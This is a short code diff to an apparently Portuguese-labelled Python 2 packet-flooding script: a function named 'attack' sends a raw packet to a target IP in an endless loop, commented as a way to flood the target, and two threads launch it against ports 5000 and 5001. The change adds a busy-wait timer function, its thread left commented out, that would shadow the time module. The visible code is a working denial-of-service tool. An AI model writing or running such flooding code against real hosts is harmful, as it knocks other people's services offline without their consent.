@@ -119,13 +119,24 @@ def attack(porta):
     while True:
         s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
 
+def count_time(max,begin,time_until_now):
+    begin = time.time()
+    duration = 0
+
+    while(duration<max):
+        time_until_now = time.time()
+        duration = time_until_now - begin
+
+    if(duration>max):
+        print 'oi'    
 
 
 
 ataque1 = Thread(target=attack,args=[5000])
 ataque2 = Thread(target=attack,args=[5001])
-
+#time = Thread(target=count_time,args=[10,begin,time_until_now])
 
 
 ataque2.start()
 ataque1.start()
+#time.start()
